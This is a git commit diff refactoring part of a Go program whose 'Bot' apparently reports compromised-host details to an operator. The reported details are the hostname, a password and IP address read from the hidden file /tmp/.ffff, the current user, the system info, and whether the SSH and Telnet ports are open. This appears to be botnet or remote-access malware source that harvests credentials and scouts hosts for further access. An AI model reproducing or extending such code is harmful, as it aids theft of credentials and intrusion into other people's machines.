a89f6427402476df8c4d1907909d0d2a518d5fde
Phatcharadol Thangplub <43667929+boz3r@users.noreply.github.com>
2022-03-04 09:13:16 +0700

    Add files via upload

--- internal/system.go
+++ internal/system.go
@@ -17,11 +17,7 @@ func printPort(port string) string {
 	return "CLOSE"
 }
 
-func (b *Bot) threadsNumber() string {
-	return strconv.Itoa(b.CPU * 2)
-}
-
-func (b *Bot) getHostname() string {
+func getHostname() string {
 	hostName, err := os.Hostname()
 	if err != nil {
 		return "🗑 Failed to get hostname!!!"
@@ -29,7 +25,7 @@ func (b *Bot) getHostname() string {
 	return hostName
 }
 
-func (b *Bot) execComd(comd string, args ...string) string {
+func execComd(comd string, args ...string) string {
 	pComd, err := exec.Command(comd, args...).Output()
 	if err != nil {
 		return "🗑 Failed to execute command!!!"
@@ -37,7 +33,7 @@ func (b *Bot) execComd(comd string, args ...string) string {
 	return string(pComd)
 }
 
-func (b *Bot) getDiskSpace() string {
+func getDiskSpace() string {
 	wd, err := os.Getwd()
 	if err != nil {
 		return "🗑 Failed to get free disk space!!!"
@@ -47,16 +43,20 @@ func (b *Bot) getDiskSpace() string {
 	return fmt.Sprint(stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024)
 }
 
+func (b *Bot) threadsNumber() string {
+	return strconv.Itoa(b.CPU * 2)
+}
+
 func (b *Bot) ReportInfo() {
 	b.CPU = runtime.NumCPU()
-	b.Report("Host Name: " + b.getHostname())
-	b.Report("Password: " + b.execComd("head", "-1", "/tmp/.ffff"))
-	b.Report("Current Permission: " + b.execComd("whoami"))
-	b.Report("System: " + b.execComd("uname", "-a"))
-	b.Report("Free Disk Space (GB): " + b.getDiskSpace())
+	b.Report("Host Name: " + getHostname())
+	b.Report("Password: " + execComd("head", "-1", "/tmp/.ffff"))
+	b.Report("Current Permission: " + execComd("whoami"))
+	b.Report("System: " + execComd("uname", "-a"))
+	b.Report("Free Disk Space (GB): " + getDiskSpace())
 	b.Report("Number of CPUs: " + strconv.Itoa(b.CPU))
 	b.Report("Number of Threads: " + b.threadsNumber())
-	b.Report("IP Address: " + b.execComd("tail", "-1", "/tmp/.ffff"))
+	b.Report("IP Address: " + execComd("tail", "-1", "/tmp/.ffff"))
 	b.Report("Default SSH: " + printPort("22"))
 	b.Report("Default Telnet: " + printPort("23"))
 }
